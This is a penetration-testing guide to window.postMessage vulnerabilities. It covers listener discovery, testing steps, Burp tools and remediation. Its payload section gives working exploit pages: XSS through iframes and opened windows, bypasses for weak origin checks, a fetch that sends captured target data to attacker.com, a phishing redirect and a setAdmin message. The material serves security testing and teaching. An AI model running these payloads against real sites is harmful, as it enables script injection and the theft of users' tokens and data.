# PostMessage Vulnerabilities

## Overview
The `window.postMessage()` API enables cross-origin communication between browser windows, iframes, and tabs. Vulnerabilities arise when the receiving page (the `message` event listener) fails to validate the origin of incoming messages, or when the sending page posts messages to insufficiently validated target origins. Exploiting postMessage vulnerabilities can lead to Cross-Site Scripting, data theft, clickjacking, and unauthorized actions performed in the context of the vulnerable origin.

## How It Works
`postMessage` allows a script in one window to send a message to another window of a different origin:
```javascript
// Sender
targetWindow.postMessage(data, targetOrigin);

// Receiver — the vulnerable pattern
window.addEventListener('message', function(event) {
  // Vulnerable: no origin check
  eval(event.data);
  // or:
  document.getElementById('output').innerHTML = event.data;
  // or:
  window.location = event.data.url;
});
```

When the listener processes `event.data` without first verifying `event.origin`, any cross-origin page that can obtain a reference to the target window (via `window.open()`, `<iframe>`, `<a target>`) can send arbitrary messages. The attacker hosts a malicious page that opens or iframes the target, then sends a crafted message that triggers a dangerous sink.

## Impact
- XSS via postMessage data reaching `innerHTML`, `eval()`, `document.write()`, or similar sinks
- Open redirect / navigation hijacking when `window.location` is set from message data
- Authentication bypass if messages control login state or session handling
- CSRF-like unauthorized actions (form submissions, API calls) triggered by malicious messages
- Data exfiltration if the page responds with sensitive data to any origin
- Privilege escalation within multi-frame applications (e.g., embedded payment widgets)
- DOM clobbering and UI spoofing via injected HTML from messages

## Where to Look
- Search JavaScript source for `addEventListener('message'` and `window.onmessage`
- Check for `postMessage` senders without a specific `targetOrigin` (using `'*'`)
- Identify `<iframe>`, `window.open()`, and `<a target>` elements that load cross-origin content
- Third-party embedded widgets (payment processors, chat widgets, social buttons)
- Single-page applications that use postMessage for cross-component communication
- Browser extensions that use postMessage to communicate with web pages
- OAuth flows that use postMessage to return tokens to the parent window

## Testing Steps
1. Search all JavaScript on the page for `message` event listeners:
   ```javascript
   // In browser console:
   getEventListeners(window)['message']
   ```
2. Use the browser DevTools Sources panel to search for "addEventListener" + "message".
3. Map out all message listeners, note what properties of `event.data` they access, and identify dangerous sinks.
4. Check if `event.origin` is validated and how: exact string match, `indexOf()`, `startsWith()`, or regex.
5. If origin validation uses `indexOf('trusted.com')`, try `https://evil.com/?x=trusted.com` as your exploit origin.
6. Set up a PoC page that sends messages to the target:
   ```html
   <script>
   var target = window.open('https://target.com/page');
   setTimeout(function() {
     target.postMessage({action: 'navigate', url: 'javascript:alert(1)'}, '*');
   }, 2000);
   </script>
   ```
7. If the target is in an iframe, embed it and send messages from your page.
8. Test each dangerous sink: `innerHTML`, `eval`, `src`, `href`, `location`, `document.write`.
9. Check what data the target sends back via `postMessage` — it may leak sensitive information to `'*'`.
10. Use DOM Invader (Burp) to automate listener discovery and taint tracking.

## Payloads / Techniques

Open a target window and send an XSS payload:
```html
<!DOCTYPE html>
<html>
<body>
<script>
  var win = window.open('https://target.com/vulnerable-page', '_blank');
  setTimeout(function() {
    // Payload depends on what the listener does with event.data
    win.postMessage('<img src=x onerror=alert(document.domain)>', '*');
  }, 3000);
</script>
</body>
</html>
```

Iframe-based exploit (when target allows framing):
```html
<!DOCTYPE html>
<html>
<body>
<iframe id="target" src="https://target.com/page" onload="sendPayload()"></iframe>
<script>
function sendPayload() {
  var frame = document.getElementById('target');
  frame.contentWindow.postMessage({
    type: 'update',
    content: '<img src=x onerror=alert(document.domain)>',
    url: 'javascript:alert(document.cookie)'
  }, '*');
}
</script>
</body>
</html>
```

Bypass weak origin validation (`indexOf`):
```javascript
// Target checks: if (event.origin.indexOf('safe.com') !== -1)
// Attacker origin: https://evil.com/?ref=safe.com
// This passes the check!
```

Bypass startsWith check:
```javascript
// Target checks: if (event.origin.startsWith('https://safe'))
// Attacker origin: https://safe.evil.com
```

Exfiltrate data by listening for responses:
```html
<script>
window.addEventListener('message', function(e) {
  // Capture any data the target sends back
  fetch('https://attacker.com/steal?data=' + encodeURIComponent(JSON.stringify(e.data)));
});
var win = window.open('https://target.com/page');
setTimeout(function() {
  win.postMessage({action: 'getToken'}, '*');
}, 2000);
</script>
```

Navigate victim to attacker page via postMessage:
```javascript
target.postMessage({url: 'https://attacker.com/phish'}, '*');
// If listener does: window.location = event.data.url
```

Trigger JSON-based actions:
```javascript
target.postMessage(JSON.stringify({
  action: 'setAdmin',
  value: true,
  token: 'ignored'
}), '*');
```

Listener analysis script (run in browser console on target page):
```javascript
// Find all message listeners
var listeners = getEventListeners(window);
if (listeners.message) {
  listeners.message.forEach(function(l) {
    console.log(l.listener.toString());
  });
}
```

## Burp Suite Tips
- Use **DOM Invader** (available in Burp's embedded Chromium browser) — it automatically identifies postMessage listeners, traces `event.data` to dangerous sinks, and generates PoC exploits.
- In the **Proxy**, intercept pages and search the response body for `addEventListener.*message` using the search function.
- Use **Collaborator** to detect out-of-band requests triggered by postMessage payloads (e.g., if a listener fetches a URL from message data).
- The **JS Miner** extension extracts JavaScript endpoints and can help spot postMessage usage patterns.
- Use **Repeater** to replay HTML exploit pages by serving them via Burp's integrated browser — navigate the browser to your PoC HTML saved as a file.

## Tools
- Burp Suite DOM Invader — automated postMessage analysis and exploit generation
- PostMessage POC Builder (browser extension) — https://github.com/Sjord/postmessage-poc
- PMHook (browser extension) — intercepts and logs all postMessage calls
- Chrome DevTools — Sources panel for listener search, console for manual testing
- Firefox Browser Toolbox — similar to Chrome DevTools
- pmscan — static analysis tool for postMessage vulnerabilities in JavaScript
- retire.js — identifies vulnerable JavaScript libraries with known postMessage issues

## Remediation
- Always validate `event.origin` in message listeners using an exact whitelist comparison:
  ```javascript
  window.addEventListener('message', function(event) {
    if (event.origin !== 'https://trusted.example.com') return;
    // process event.data safely
  });
  ```
- Never use `indexOf()`, `startsWith()`, or loose checks for origin validation — use strict equality.
- Do not process `event.data` in dangerous sinks (`innerHTML`, `eval`, `document.write`, `location`).
- When sending messages, always specify an explicit `targetOrigin` instead of `'*'`:
  ```javascript
  frame.contentWindow.postMessage(data, 'https://trusted.com');
  ```
- Sanitize `event.data` before using it, even when the origin is trusted (defense-in-depth).
- Implement CSP to reduce XSS impact from any postMessage-based injection.
- Use `structuredClone()` for received data to prevent prototype pollution via postMessage.

## References
https://portswigger.net/web-security/dom-based/controlling-the-web-message-source
https://owasp.org/www-community/attacks/Cross-Site_WebSocket_Hijacking
https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_for_Client-side_Prototype_Pollution
https://book.hacktricks.xyz/pentesting-web/postmessage-vulnerabilities
